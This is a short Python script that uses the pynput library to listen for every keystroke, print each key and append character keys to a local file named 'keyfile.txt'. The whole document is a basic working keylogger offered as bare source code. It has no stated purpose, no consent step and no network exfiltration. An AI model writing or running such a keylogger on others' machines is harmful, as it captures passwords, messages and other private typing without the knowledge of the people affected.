# import pynput
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKye:
        try:
            char = key.char
            logKye.write(char)
        except:
            print("Error getting in char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()